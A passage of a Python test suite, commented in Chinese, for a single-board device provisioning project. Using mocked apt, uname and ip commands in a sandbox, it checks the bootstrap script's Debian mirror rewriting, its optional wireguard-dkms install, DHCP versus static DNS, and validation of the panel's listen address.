        log_pass("wireguard-dkms 改为按需安装 (仅源确实提供时)")
    else:
        log_fail("未实现 wireguard-dkms 按需安装")

    if "ONECLOUD_APT_SKIP_MIRROR" in src and "ONECLOUD_APT_MIRROR" in src:
        log_pass("提供换源逃生开关 (跳过/自定义镜像)")
    else:
        log_fail("缺少换源逃生开关", "镜像不可达时用户无法绕过")

    # ---- 2) 行为验证: 提取 helper 与步骤3~5 逐场景跑 mock ----
    i_log = next((i for i, l in enumerate(lines) if l.startswith("log_info()  {")), -1)
    i_net = next((i for i, l in enumerate(lines) if l.startswith("# 网段计算")), -1)
    i_s3 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 3. 换国内源")), -1)
    i_s6 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 6. 配置时区")), -1)
    if min(i_log, i_net, i_s3, i_s6) < 0:
        log_fail("无法在 bootstrap.sh 定位 helper / 步骤锚点",
                 "代码结构变了, 需同步更新本测试的锚点")
        return

    helpers = "\n".join(lines[i_log:i_net - 1])
    flow = "\n".join(lines[i_s3:i_s6])

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t21_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    mocks = {
        "apt": r"""#!/bin/bash
echo "apt $*" >> "$APT_LOG"
if [ "$1" = "update" ] && [ "$MOCK_FAIL_UPDATE" = "1" ]; then
    echo "E: Failed to fetch http://mirrors.tuna.tsinghua.edu.cn/debian/dists/bookworm/InRelease  502  Bad Gateway" >&2
    exit 100
fi
if [ "$1" = "upgrade" ] && [ "$MOCK_FAIL_UPGRADE" = "1" ]; then
    echo "E: Unable to correct problems, you have held broken packages." >&2
    exit 100
fi
for a in "$@"; do
    if [ "$a" = "wireguard-dkms" ] && [ "$MOCK_DKMS_INSTALL_FAIL" = "1" ]; then
        echo "E: Unable to locate package wireguard-dkms" >&2
        exit 100
    fi
done
exit 0
""",
        "apt-cache": r"""#!/bin/bash
echo "apt-cache $*" >> "$APT_LOG"
if [ "$1" = "show" ] && [ "$2" = "wireguard-dkms" ]; then
    if [ "$MOCK_DKMS_AVAILABLE" = "1" ]; then
        echo "Package: wireguard-dkms"
        exit 0
    fi
    echo "E: No packages found" >&2
    exit 100
fi
exit 0
""",
        "uname": r"""#!/bin/bash
[ "$1" = "-r" ] && { echo "$MOCK_KERNEL"; exit 0; }
echo Linux
exit 0
""",
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
WORK="@WORK@"
M="@MOCK@"
PATH="$M:/usr/bin:/bin"
export PATH

run_case() {
    local tag="$1" id="$2" cn="$3" legacy="$4" deb822="$5"
    shift 5
    local root="$WORK/root_$tag"
    mkdir -p "$root/apt/sources.list.d"
    printf 'ID=%s\nVERSION_CODENAME=%s\n' "$id" "$cn" > "$root/os-release"
    if [ "$deb822" = "1" ]; then
        cat > "$root/apt/sources.list.d/debian.sources" <<'EOS'
Types: deb
URIs: http://deb.debian.org/debian
Suites: bookworm bookworm-updates
Components: main
Signed-By: /usr/share/keyrings/debian-archive-keyring.gpg
EOS
    fi
    if [ "$legacy" = "1" ]; then
        cat > "$root/apt/sources.list" <<'EOS'
deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free
deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free
EOS
    fi
    export ONECLOUD_ETC_ROOT="$root"
    export APT_LOG="$WORK/apt_$tag.log"
    : > "$APT_LOG"
    export MOCK_FAIL_UPDATE=0 MOCK_FAIL_UPGRADE=0 MOCK_DKMS_AVAILABLE=0
    export MOCK_DKMS_INSTALL_FAIL=0 MOCK_KERNEL=5.10.63-rockchip
    unset ONECLOUD_APT_SKIP_MIRROR
    # v1.4.5 起换源/更新默认跳过; 本组验证的是"开启后"的老行为, 故显式打开
    export DO_MIRROR=true DO_APT_UPDATE=true DO_APT_UPGRADE=true DO_APT_PKGS=true
    local kv
    for kv in "$@"; do export "$kv"; done
    ( set -e; step_apt_flow ) > "$WORK/out_$tag.txt" 2>&1
    echo "###RC:$tag:$?"
    echo "###OUT_BEGIN:$tag"
    cat "$WORK/out_$tag.txt"
    echo "###OUT_END:$tag"
    echo "###SOURCES_BEGIN:$tag"
    [ -f "$root/apt/sources.list" ] && cat "$root/apt/sources.list"
    [ -f "$root/apt/sources.list.d/debian.sources" ] && cat "$root/apt/sources.list.d/debian.sources"
    echo "###SOURCES_END:$tag"
    echo "###APTLOG_BEGIN:$tag"
    cat "$APT_LOG"
    echo "###APTLOG_END:$tag"
    echo "###BAK_BEGIN:$tag"
    [ -f "$root/apt/sources.list.onecloud.bak" ] && echo "sources.list.onecloud.bak"
    [ -f "$root/apt/sources.list.d/debian.sources.onecloud.bak" ] && echo "debian.sources.onecloud.bak"
    echo "###BAK_END:$tag"
}

run_case s1_bookworm_ok       debian bookworm 1 0
run_case s2_update_100        debian bookworm 1 0 MOCK_FAIL_UPDATE=1
run_case s3_upgrade_100       debian bookworm 1 0 MOCK_FAIL_UPGRADE=1
run_case s4_oldkern_nodkms    debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip
run_case s5_oldkern_dkms      debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip MOCK_DKMS_AVAILABLE=1
run_case s6_deb822            debian bookworm 1 1
run_case s7_ubuntu            ubuntu jammy    1 0
run_case s8_skip_mirror       debian bookworm 1 0 DO_MIRROR=false
run_case s9_bullseye          debian bullseye 1 0
run_case s10_dkms_install_100 debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip MOCK_DKMS_AVAILABLE=1 MOCK_DKMS_INSTALL_FAIL=1
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(
        helpers + "\n\nstep_apt_flow() {\n" + flow + "\n}\n" + driver
        .replace("@WORK@", _posix(tmpdir))
        .replace("@MOCK@", _posix(mockbin)),
        encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=420)
        out = r.stdout

        def sect(name, tag):
            m = re.search(rf"###{name}_BEGIN:{tag}\n(.*?)\n###{name}_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        def rc(tag):
            m = re.search(rf"###RC:{tag}:(\d+)", out)
            return int(m.group(1)) if m else None

        if "###DONE" not in out:
            log_fail("mock 驱动未跑完", f"stderr={r.stderr[-300:]}")
            return

        # --- s1: 核心回归 (bookworm 机器 + 旧 bullseye 源残留) ---
        s1 = sect("SOURCES", "s1_bookworm_ok")
        c1 = sect("OUT", "s1_bookworm_ok")
        a1 = sect("APTLOG", "s1_bookworm_ok")
        if rc("s1_bookworm_ok") == 0:
            log_pass("bookworm 机器上初始化成功退出 (老实现此处 apt 100)")
        else:
            log_fail(f"bookworm 机器初始化退出码 {rc('s1_bookworm_ok')}")
        if "bookworm main contrib non-free non-free-firmware" in s1 and "bullseye" not in s1:
            log_pass("源按实际代号写成 bookworm (含 non-free-firmware), 无 bullseye 残留")
        else:
            log_fail("源代号或组件不正确", s1[:200])
        if "-updates" in s1 and "-backports" in s1 and "bookworm-security" in s1:
            log_pass("updates / backports / security 三类源齐全")
        else:
            log_fail("源条目不全", s1[:200])
        if "wireguard-tools" in a1 and "wireguard-dkms" not in a1:
            log_pass("基础工具装 wireguard-tools, 不再装 wireguard-dkms")
        else:
            log_fail("基础工具安装列表不正确", a1[:200])
        if "已内置 wireguard" in c1:
            log_pass("5.6+ 内核识别为内置 wireguard, 明确跳过 dkms")
        else:
            log_fail("未识别内置 wireguard 模块", c1[-200:])
        if "sources.list.onecloud.bak" in sect("BAK", "s1_bookworm_ok"):
            log_pass("改写前备份原 sources.list")
        else:
            log_fail("未备份原 sources.list", "出问题无法回滚")

        # --- s2: apt update 返回 100 (v1.4.5 起为非致命步骤, 但报错必须透出) ---
        c2 = sect("OUT", "s2_update_100")
        if rc("s2_update_100") == 0:
            log_pass("apt update 失败不致命 (不再让整机初始化停在半路)")
        else:
            log_fail(f"apt update 失败导致整体退出 {rc('s2_update_100')}")
        if "apt 步骤失败" in c2 and "100 = apt/dpkg 处理失败" in c2:
            log_pass("失败时打印步骤名并解释 100 的含义")
        else:
            log_fail("未给出 100 的解释", c2[-300:])
        if "源文件:" in c2 and "系统代号" in c2:
            log_pass("给出源文件与系统代号等排查线索")
        else:
            log_fail("缺少排查线索")
        if "502  Bad Gateway" in c2:
            log_pass("保留 apt 原始报错 (不再只看到裸退出码)")
        else:
            log_fail("未保留 apt 原始输出")

        # --- s3: apt upgrade 失败不应中断 ---
        c3 = sect("OUT", "s3_upgrade_100")
        if rc("s3_upgrade_100") == 0:
            log_pass("apt upgrade 失败不致命, 不中断整机初始化")
        else:
            log_fail(f"升级失败导致整体退出 {rc('s3_upgrade_100')}", "主机名/源已改却什么都没配完")
        if "该步骤失败但继续" in c3:
            log_pass("升级失败时明确告警并继续")
        else:
            log_fail("升级失败未告警")
        if "apt install" in sect("APTLOG", "s3_upgrade_100"):
            log_pass("升级失败后仍继续安装基础工具")
        else:
            log_fail("升级失败后未继续安装基础工具")

        # --- s4/s5: 老内核下 dkms 按需安装 ---
        c4 = sect("OUT", "s4_oldkern_nodkms")
        a4 = sect("APTLOG", "s4_oldkern_nodkms").replace("apt-cache show wireguard-dkms", "")
        if rc("s4_oldkern_nodkms") == 0 and "不提供 wireguard-dkms" in c4 and "wireguard-dkms" not in a4:
            log_pass("老内核 + 源无该包: 跳过而非硬装 (这是 100 的根因)")
        else:
            log_fail("源不提供该包时未正确跳过", c4[-200:])
        a5 = sect("APTLOG", "s5_oldkern_dkms")
        if rc("s5_oldkern_dkms") == 0 and "install -y wireguard-dkms" in a5:
            log_pass("老内核 + 源提供该包: 按需安装")
        else:
            log_fail("应当按需安装时未安装", a5[:200])

        # --- s6: deb822 布局就地重写 ---
        s6 = sect("SOURCES", "s6_deb822")
        b6 = sect("BAK", "s6_deb822")
        if rc("s6_deb822") == 0 and "Suites: bookworm bookworm-updates bookworm-backports" in s6:
            log_pass("识别 deb822 源文件并就地重写为实际代号")
        else:
            log_fail("deb822 源未正确重写", s6[:250])
        active_bullseye = [ln for ln in s6.splitlines()
                           if "bullseye" in ln and not ln.startswith("# [onecloud-disabled]")]
        if "# [onecloud-disabled]" in s6 and not active_bullseye:
            log_pass("残留的 classic bullseye 源被注释, 不再有生效的重复源")
        else:
            log_fail("仍存在生效的 bullseye 源条目", str(active_bullseye)[:200])
        if "debian.sources.onecloud.bak" in b6 and "sources.list.onecloud.bak" in b6:
            log_pass("deb822 与 classic 源文件均留备份")
        else:
            log_fail("备份不完整", b6[:200])

        # --- s7/s8: 跳过换源的两种情况 ---
        s7 = sect("SOURCES", "s7_ubuntu")
        if rc("s7_ubuntu") == 0 and "非 Debian 系" in sect("OUT", "s7_ubuntu") \
                and "bullseye main contrib non-free" in s7:
            log_pass("非 Debian 系统跳过换源, 原源文件不被触碰")
        else:
            log_fail("非 Debian 系统处理不正确", s7[:200])
        s8 = sect("SOURCES", "s8_skip_mirror")
        if rc("s8_skip_mirror") == 0 and "换源: 跳过" in sect("OUT", "s8_skip_mirror") \
                and "bullseye main contrib non-free" in s8:
            log_pass("不换源 (DO_MIRROR=false) 时完全不动源文件")
        else:
            log_fail("跳过换源开关未生效", s8[:200])

        # --- s9: bullseye 机器 ---
        s9 = sect("SOURCES", "s9_bullseye")
        if rc("s9_bullseye") == 0 and "bullseye main contrib non-free" in s9 \
                and "non-free-firmware" not in s9:
            log_pass("bullseye 机器按实际代号写入, 且不写它没有的组件")
        else:
            log_fail("bullseye 代号或组件处理不正确", s9[:250])

        # --- s10: 包真的不存在时仍能透出原因 ---
        c10 = sect("OUT", "s10_dkms_install_100")
        if rc("s10_dkms_install_100") == 100 and "Unable to locate package wireguard-dkms" in c10:
            log_pass("apt 真失败时透出原始报错 (可定位到具体包)")
        else:
            log_fail("未透出 apt 原始报错", c10[-250:])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def test_bootstrap_dns_mode():
    """测试 22: bootstrap 的 DNS 新增「DHCP 自动获取」并设为默认

    背景: 原先 DNS 兜底写死 1.1.1.1 (lib-nodes.sh 亦然), 路由器已下发 DNS 的场景
    反而被硬编码盖掉, 也无法表达"不干预、交给系统"。改为默认 dhcp (自动获取)。
    """
    print("\n" + "=" * 60)
    print("测试 22: bootstrap DNS 模式 (DHCP 自动获取 / 静态指定)")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    lib = SCRIPTS_DIR / "lib-nodes.sh"
    wg = SCRIPTS_DIR / "wireguard-setup.sh"
    inv = PROJECT_ROOT / "inventory" / "nodes.yaml"
    missing = [str(p) for p in (boot, lib, wg, inv) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return
    src = boot.read_text(encoding="utf-8")
    lsrc = lib.read_text(encoding="utf-8")
    wsrc = wg.read_text(encoding="utf-8")
    isrc = inv.read_text(encoding="utf-8")

    # ---- 1) 静态检查 ----
    if "dns_is_auto()" in src and "dns_apply_mode()" in src:
        log_pass("具备 DNS 取值归一化函数 (dns_is_auto / dns_apply_mode)")
    else:
        log_fail("缺少 DNS 取值归一化函数")

    if "--dns-dhcp" in src and "dhcp|auto|none|automatic" in src:
        log_pass("支持 --dns-dhcp 及 dhcp/auto/none 等自动获取写法")
    else:
        log_fail("未识别 dhcp/auto 等自动获取写法")

    if 'DNS_SERVERS="1.1.1.1"' in src:
        log_fail("DNS 兜底仍写死 1.1.1.1", "应改为 dhcp (自动获取)")
    else:
        log_pass("bootstrap 不再把 1.1.1.1 写死为 DNS 兜底")

    if '${_NODE_FIELD[__net__.dns]:-dhcp}' in lsrc:
        log_pass("清单未配 dns 时默认 dhcp (lib-nodes.sh)")
    else:
        log_fail("lib-nodes.sh 的 NET_DNS 仍兜底成固定地址")

    if re.search(r"^\s*dns:\s*dhcp\s*$", isrc, re.M):
        log_pass("inventory/nodes.yaml 的 network.dns 已同步为 dhcp")
    else:
        log_fail("清单默认值未同步为 dhcp", "清单与脚本默认值会漂移")

    if "WG_NET_DNS" in wsrc:
        log_pass("wireguard 对 dhcp 标记做了回退 (wg0.conf 必须是具体地址)")
    else:
        log_fail("wireguard 会把 dhcp 字面值写进 wg0.conf", "客户端无法解析")

    # ---- 2) 行为验证: 跑真实脚本的 dry-run / 交互 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t22_"))

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    def run_boot(args, env_extra=None, stdin_data=None, tty="0", timeout=90):
        """跑 bootstrap。

        stdin 必须按**字节**喂: Windows 上 Python 的 text 模式会把 "\\n" 转成
        "\\r\\n", bash 的 read 会把 \\r 当成内容读进去 (交互测试会因此拿到 "\\r"
        而不是空串), 导致断言以肉眼看不见的方式失败。
        """
        env = dict(os.environ)
        env["ONECLOUD_BOOTSTRAP_TTY"] = tty
        env["ONECLOUD_ETC_ROOT"] = _posix(tmpdir)   # 越界也不会碰真实 /etc
        if env_extra:
            env.update(env_extra)
        kwargs = dict(capture_output=True, env=env, cwd=str(SCRIPTS_DIR),
                      timeout=timeout)
        if stdin_data is None:
            kwargs["stdin"] = subprocess.DEVNULL
        else:
            kwargs["input"] = stdin_data.encode("utf-8")
        r = subprocess.run(["bash", _posix(boot)] + args, **kwargs)
        return subprocess.CompletedProcess(
            r.args, r.returncode,
            r.stdout.decode("utf-8", "replace"),
            r.stderr.decode("utf-8", "replace"))

    def dns_of(out):
        m = re.search(r"^\s*DNS:\s+(.*?)\s{2,}\(来源:\s*([^)]+)\)", out, re.M)
        return m.groups() if m else (None, None)

    base = ["--node", "wk-edge-01", "--ip", "192.168.1.101", "--hostname", "edge-01"]

    try:
        # 默认 (清单 dns: dhcp)
        r = run_boot(base + ["--dry-run"])
        val, srce = dns_of(r.stdout)
        if val == "自动获取 (DHCP)" and "将设置: DNS 不写入" in r.stdout:
            log_pass("默认即为自动获取 (清单未强制静态 DNS)")
        else:
            log_fail(f"默认 DNS 不是自动获取: {val} / 来源={srce}")

        # 三种等价写法
        for arg in (["--dns", "auto"], ["--dns", "none"], ["--dns-dhcp"]):
            r = run_boot(base + arg + ["--dry-run"])
            val, srce = dns_of(r.stdout)
            if val == "自动获取 (DHCP)" and srce == "命令行":
                log_pass(f"{' '.join(arg)} 识别为自动获取")
            else:
                log_fail(f"{' '.join(arg)} 未识别为自动获取: {val} / {srce}")

        # 静态指定
        r = run_boot(base + ["--dns", "1.1.1.1,8.8.8.8", "--dry-run"])
        val, srce = dns_of(r.stdout)
        if val == "1.1.1.1, 8.8.8.8" and "将设置: DNS = 1.1.1.1, 8.8.8.8" in r.stdout:
            log_pass("--dns 指定多个地址时按列表写入")
        else:
            log_fail(f"静态 DNS 处理不正确: {val} / {srce}")

        # 环境变量
        r = run_boot(base + ["--dry-run"], {"ONECLOUD_DNS": "223.5.5.5"})
        val, srce = dns_of(r.stdout)
        if val == "223.5.5.5" and srce == "环境变量":
            log_pass("ONECLOUD_DNS 生效并标注来源")
        else:
            log_fail(f"ONECLOUD_DNS 未生效: {val} / {srce}")

        # 优先级: --dns > ONECLOUD_DNS
        r = run_boot(base + ["--dns", "8.8.8.8", "--dry-run"], {"ONECLOUD_DNS": "223.5.5.5"})
        val, srce = dns_of(r.stdout)
        if val == "8.8.8.8" and srce == "命令行":
            log_pass("--dns 优先于 ONECLOUD_DNS")
        else:
            log_fail(f"优先级错误: {val} / {srce}")

        # 交互: 回车 = 自动获取, 且在确认环节取消 (不会修改系统)
        # 输入前两个回车用于跳过 v1.4.5 新增的 apt 开关询问 (换源 / 更新)
        r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.1.101"],
                     stdin_data="\n\n\nn\n", tty="1")
        if "自动获取 (DHCP)" in r.stdout and "设置主机名" not in r.stdout:
            log_pass("交互式直接回车 = 自动获取 (且确认前可安全取消)")
        else:
            log_fail("交互式回车未走自动获取", r.stdout[-300:])

        r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.1.101"],
                     stdin_data="\n\n8.8.8.8\nn\n", tty="1")
        if "8.8.8.8" in r.stdout and "设置主机名" not in r.stdout:
            log_pass("交互式输入地址覆盖默认值")
        else:
            log_fail("交互式覆盖失败", r.stdout[-300:])

        # ---- 3) 步骤 11 实际写盘 (4 种组合) ----
        lines = src.splitlines()
        i11 = next((i for i, l in enumerate(lines)
                    if l.startswith("# ---- 11. 设置静态 IP")), -1)
        i12 = next((i for i, l in enumerate(lines)
                    if l.startswith("# ---- 12. 配置")), -1)
        if min(i11, i12) < 0:
            log_fail("无法定位步骤 11 锚点", "代码结构变了, 需同步更新本测试")
            return
        flow11 = "\n".join(lines[i11:i12])
        probe = tmpdir / "probe11.sh"
        probe.write_text(
            'GREEN=""; YELLOW=""; RED=""; NC=""\n'
            'log_info()  { echo "[INFO] $*"; }\n'
            'log_warn()  { echo "[WARN] $*"; }\n'
            'log_error() { echo "[ERROR] $*"; }\n'
            + flow11 + "\n",
            encoding="utf-8", newline="\n")

        def run_step11(tag, layout, mode, servers, dlist):
            root = tmpdir / f"etc_{tag}"
            if layout == "ifupdown":
                (root / "network").mkdir(parents=True, exist_ok=True)
                (root / "network" / "interfaces").write_text("", encoding="utf-8")
                artifact = root / "network" / "interfaces"
            else:
                (root / "netplan").mkdir(parents=True, exist_ok=True)
                artifact = root / "netplan" / "99-static.yaml"
            env = dict(os.environ)
            env.update({
                "ONECLOUD_ETC_ROOT": _posix(root),
                "NODE_IP": "192.168.6.101", "LAN_PREFIX": "24",
                "GATEWAY": "192.168.6.1", "DNS_MODE": mode,
                "DNS_SERVERS": servers, "DNS_LIST": dlist,
            })
            subprocess.run(["bash", _posix(probe)], env=env, cwd=str(SCRIPTS_DIR),
                           capture_output=True, text=True, encoding="utf-8",
                           errors="replace", stdin=subprocess.DEVNULL, timeout=60)
            return artifact.read_text(encoding="utf-8") if artifact.exists() else ""

        s = run_step11("a", "ifupdown", "dhcp", "", "自动获取 (DHCP)")
        if "address 192.168.6.101/24" in s and "dns-nameservers" not in s:
            log_pass("ifupdown + 自动获取: 写静态地址但不写 dns-nameservers")
        else:
            log_fail("ifupdown 自动获取模式下仍写入了 dns-nameservers", s[:200])

        s = run_step11("b", "ifupdown", "static", "1.1.1.1,8.8.8.8", "1.1.1.1, 8.8.8.8")
        if "dns-nameservers 1.1.1.1, 8.8.8.8" in s:
            log_pass("ifupdown + 静态指定: 正常写入 dns-nameservers")
        else:
            log_fail("ifupdown 静态 DNS 未写入", s[:200])

        s = run_step11("c", "netplan", "dhcp", "", "自动获取 (DHCP)")
        if "dhcp4: true" in s and "use-routes: false" in s and "nameservers" not in s:
            log_pass("netplan + 自动获取: dhcp4 只取 DNS (关 use-routes), 不写 nameservers")
        else:
            log_fail("netplan 自动获取配置不正确", s[:250])
        if "addresses:" in s and "192.168.6.101/24" in s and "via: 192.168.6.1" in s:
            log_pass("netplan 自动获取模式仍保留静态地址与静态网关")
        else:
            log_fail("netplan 静态地址/网关丢失", s[:250])

        s = run_step11("d", "netplan", "static", "223.5.5.5", "223.5.5.5")
        if "nameservers:" in s and "- 223.5.5.5" in s and "dhcp4" not in s:
            log_pass("netplan + 静态指定: 写 nameservers 列表, 不启用 dhcp4")
        else:
            log_fail("netplan 静态 DNS 配置不正确", s[:250])

        # ---- 4) 文档同步 ----
        readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
        if "DNS 默认为 `dhcp`" in readme and "--dns-dhcp" in readme:
            log_pass("README 已记录 DNS 默认值与自动获取写法")
        else:
            log_fail("README 未说明新的 DNS 默认行为", "文档与实际行为会漂移")

        sreadme = (SCRIPTS_DIR / "README.md").read_text(encoding="utf-8")
        if "dhcp" in sreadme and "DNS" in sreadme:
            log_pass("scripts/README 已同步 DNS 说明")
        else:
            log_fail("scripts/README 未同步 DNS 说明")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试23: 面板监听地址 ============
def test_panel_listen_host():
    """测试 23: 面板监听地址 —— 拦截「网段地址 / 回环网络地址」等绑不上的取值

    背景: 监听地址此前是自由文本、零校验。填成 127.0.0.0 (回环网段的网络地址)
    或 192.168.1.0 (想表达"同网段"却写成了网段地址) 都不会当场报错, 要等
    systemd 启动 app.py 才以 "Cannot assign requested address" 失败, 报错信息
    里看不出真正原因。

    本组验证三层防线:
      1) init.sh           交互引导 —— 首选本机局域网地址, 误填时给出原因与替代值
      2) install-service.sh 入参校验 —— 被直接调用时也不放行
      3) app.py            运行时校验 —— 绕过前两层也拦得住
    """
    print("\n" + "=" * 60)
    print("测试 23: 面板监听地址 (误填拦截 / 同网段引导)")
    print("=" * 60)

    lib = SCRIPTS_DIR / "lib-panel-host.sh"
    entry = PROJECT_ROOT / "init" / "init.sh"
    service = PANEL_DIR / "install-service.sh"
    app_py = PANEL_DIR / "app.py"
    missing = [str(p) for p in (lib, entry, service, app_py) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return

    src = entry.read_text(encoding="utf-8")
    ssrc = service.read_text(encoding="utf-8")
    asrc = app_py.read_text(encoding="utf-8")
    lsrc = lib.read_text(encoding="utf-8")

    # ---- 1) 静态检查 ----
    need_fns = ["panel_detect_local_ipv4", "panel_host_check", "panel_host_is_local",
                "panel_host_desc", "panel_host_cidr"]
    missing_fns = [fn for fn in need_fns
                   if not re.search(r'^' + re.escape(fn) + r'\(\)\s*\{', lsrc, re.MULTILINE)]
    if missing_fns:
        log_fail(f"lib-panel-host.sh 缺少函数: {missing_fns}")
    else:
        log_pass(f"lib-panel-host.sh 函数齐全（{len(need_fns)} 个）")

    if "${SCRIPTS_DIR}/lib-panel-host.sh" in src:
        log_pass("init.sh 已接入 lib-panel-host.sh（校验逻辑单一实现）")
    else:
        log_fail("init.sh 未接入 lib-panel-host.sh", "监听地址校验不应各自实现")

    if "请输入监听地址 (例 0.0.0.0 或 127.0.0.1)" in src:
        log_fail("init.sh 仍用无校验的自由文本读监听地址",
                 "该写法会原样放行 127.0.0.0 / 192.168.1.0")
    else:
        log_pass("init.sh 不再用无校验的自由文本读监听地址")

    if re.search(r"^panel_choose_host\(\)\s*\{", src, re.MULTILINE):
        log_pass("init.sh 提供面板监听地址选择流程 (panel_choose_host)")
    else:
        log_fail("init.sh 缺少 panel_choose_host")

    if "本机局域网地址" in src and "手动输入其它 IPv4 地址" in src:
        log_pass("监听地址菜单含「本机局域网地址」与手动输入选项")
    else:
        log_fail("监听地址菜单缺少「本机局域网地址」选项")

    if "panel_host_check" in ssrc and "PANEL_HOST_SUGGEST" in ssrc:
        log_pass("install-service.sh 对注入的 PANEL_HOST 做了校验")
    else:
        log_fail("install-service.sh 未校验 PANEL_HOST",
                 "绕过 init.sh 直接调用时会写入绑不上的地址")

    if "def resolve_bind_host" in asrc and "sys.exit(2)" in asrc:
        log_pass("app.py 在启动前校验绑定地址 (resolve_bind_host)")
    else:
        log_fail("app.py 未校验 PANEL_HOST")

    if "127.0.0.0" in asrc or "octets[3] in (0, 255)" in asrc:
        log_pass("app.py 明确拦住了网段地址与广播地址")
    else:
        log_fail("app.py 未拦住网段地址")

    # ---- 2) 行为验证: 用 mock `ip` 提供一张假网卡 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t23_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir(parents=True, exist_ok=True)

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    # mock iproute2: 一台同时有 eth0 192.168.1.101/24 与 wg0 10.8.0.101/24 的机器
    ip_mock = ("#!/bin/bash\n"
               "case \"$*\" in\n"
               "    *addr*)\n"
               "        printf '2: eth0    inet 192.168.1.101/24 brd 192.168.1.255 scope global eth0\\n'\n"
               "        printf '4: wg0     inet 10.8.0.101/24 scope global wg0\\n'\n"
               "        ;;\n"
               "esac\n"
               "exit 0\n")
    # 空壳 python3: 只为让 init.sh 的 pick_python 通过 (测试全程在确认环节取消)
    for name, body in (("ip", ip_mock), ("python3", "#!/bin/bash\nexit 0\n")):
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        try:
            os.chmod(p, 0o755)
        except OSError:
            pass

    def env_mock():
        env = dict(os.environ)
        env["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"   # 白名单式 PATH, 不继承宿主注入
        return env

    def run_lib(script):
        r = subprocess.run(["bash", "-c", script], capture_output=True, env=env_mock(),
                           cwd=str(PROJECT_ROOT), timeout=60)
        return r.returncode, r.stdout.decode("utf-8", "replace")

    # 判定表: 地址 -> 是否可作监听地址
    cases = [
        ("127.0.0.0", False), ("127.0.0.1", True), ("192.168.1.0", False),
        ("192.168.1.255", False), ("192.168.1.101", True), ("192.168.1.254", True),
        ("10.8.0.101", True), ("0.0.0.0", True), ("0.1.2.3", False),
        ("224.0.0.1", False), ("240.0.0.1", False), ("255.255.255.255", False),
        ("169.254.1.1", False), ("192.168.1", False), ("192.168.1.256", False),
        ("abc", False), ("::1", False),
    ]
    script = ('. "$PWD/scripts/lib-panel-host.sh"\n'
              'for ip in ' + " ".join(f"'{c[0]}'" for c in cases) + '; do\n'
              '    if panel_host_check "$ip"; then\n'
              '        printf "%s|OK|%s\\n" "$ip" "${PANEL_HOST_SUGGEST}"\n'
              '    else\n'
              '        printf "%s|NG|%s\\n" "$ip" "${PANEL_HOST_SUGGEST}"\n'
              '    fi\n'
              'done\n')
    _, out = run_lib(script)
    got = {}
    for ln in out.splitlines():
        parts = ln.split("|")
        if len(parts) == 3:
            got[parts[0]] = (parts[1] == "OK", parts[2])

    wrong = [(ip, want) for ip, want in cases if got.get(ip, (None,))[0] is not want]
    if wrong:
        log_fail(f"判定不符预期: {wrong}")
    else:
        log_pass(f"监听地址判定正确（{len(cases)} 个取值: 网络/广播/组播/保留/回环/非法格式/合法）")

    # 误填时的替代值: 这正是「想同网段可访问」的落点
    suggest_map = [("127.0.0.0", "127.0.0.1"), ("192.168.1.0", "192.168.1.101"),
                   ("192.168.1.255", "192.168.1.101")]
    bad_suggest = [(ip, got.get(ip, ("", ""))[1], want)
                   for ip, want in suggest_map if got.get(ip, ("", ""))[1] != want]
    if bad_suggest:
        log_fail(f"替代值不符预期: {bad_suggest}")
    else:
        log_pass("误填网段地址/回环网络地址时给出可用替代值（含本机在该网段的地址）")

    # 归属与本机网段
    script = ('. "$PWD/scripts/lib-panel-host.sh"\n'
              'for ip in 192.168.1.101 10.8.0.101 127.0.0.1 192.168.1.102; do\n'
              '    if panel_host_is_local "$ip"; then echo "$ip|yes"; else echo "$ip|no"; fi\n'
              'done\n'
              'echo "cidr|$(panel_host_cidr 192.168.1.101)"\n'
              'echo "desc|$(panel_host_desc 192.168.1.101)"\n')
    _, out = run_lib(script)
    if "192.168.1.101|yes" in out and "10.8.0.101|yes" in out and "127.0.0.1|yes" in out \
            and "192.168.1.102|no" in out:
        log_pass("本机地址归属判定正确 (含 127.0.0.1 特例)")
    else:
        log_fail("本机地址归属判定有误")

    if "cidr|192.168.1.0/24" in out:
        log_pass("网段展示取网络地址而非主机地址 (192.168.1.0/24)")
    else:
        log_fail("网段展示有误", "应显示 192.168.1.0/24 而不是 192.168.1.101/24")

    if "同网段 192.168.1.0/24 可访问" in out:
